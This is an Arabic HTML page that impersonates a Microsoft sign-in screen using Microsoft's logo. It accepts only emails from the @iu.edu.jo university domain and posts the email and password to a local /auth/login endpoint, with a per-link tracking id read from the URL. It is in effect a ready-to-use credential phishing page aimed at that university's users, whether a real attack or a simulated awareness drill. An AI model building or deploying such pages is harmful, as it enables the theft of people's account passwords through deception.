<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, sans-serif;
      background: #f3f2f1;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background: #fff;
      padding: 40px;
      border-radius: 6px;
      width: 360px;
      box-shadow: 0 0 8px rgba(0,0,0,0.1);
      text-align: center;
    }
    .login-box img {
      width: 100px;
      margin-bottom: 20px;
    }
    .login-box h2 {
      margin-bottom: 20px;
      color: #333;
      font-size: 18px;
    }
    .form-control {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
      text-align: left;
      direction: ltr;
    }
    .btn {
      background: #0067b8;
      color: #fff;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
    }
    .btn:hover {
      background: #005a9e;
    }
    .footer-link {
      margin-top: 15px;
      display: block;
      color: #0067b8;
      text-decoration: none;
      font-size: 14px;
    }
    .footer-link:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo.svg" alt="Microsoft Logo">
    <h2>تسجيل الدخول بإستخدام بريدك الجامعي</h2>
    
    <!-- الخطوة الأولى: البريد -->
    <div id="step-email">
      <input type="email" id="email" class="form-control" placeholder="البريد الإلكتروني" required>
      <button class="btn" onclick="validateEmail()">التالي</button>
    </div>

    <!-- الخطوة الثانية: كلمة المرور -->
    <form id="step-password" action="/auth/login" method="POST" style="display:none;">
      <input type="hidden" name="email" id="hiddenEmail">
      <input type="password" name="password" class="form-control" placeholder="كلمة المرور" required>
      <input type="hidden" id="linkId" name="id">
      <button type="submit" class="btn">تسجيل الدخول</button>
      <a href="#" class="footer-link">هل نسيت كلمة المرور؟</a>
    </form>
  </div>

  <script>
    // حفظ id في hidden field
    const params = new URLSearchParams(window.location.search);
    const linkId = params.get('id');
    if (linkId) {
      document.getElementById('linkId').value = linkId;
    }

    // التحقق من البريد
    function validateEmail() {
      const email = document.getElementById('email').value.trim();
      if (email.endsWith('@iu.edu.jo')) {
        document.getElementById('hiddenEmail').value = email;
        document.getElementById('step-email').style.display = 'none';
        document.getElementById('step-password').style.display = 'block';
      } else {
        alert('❌ يجب إدخال بريد ينتهي بـ @iu.edu.jo');
      }
    }
  </script>
</body>
</html>
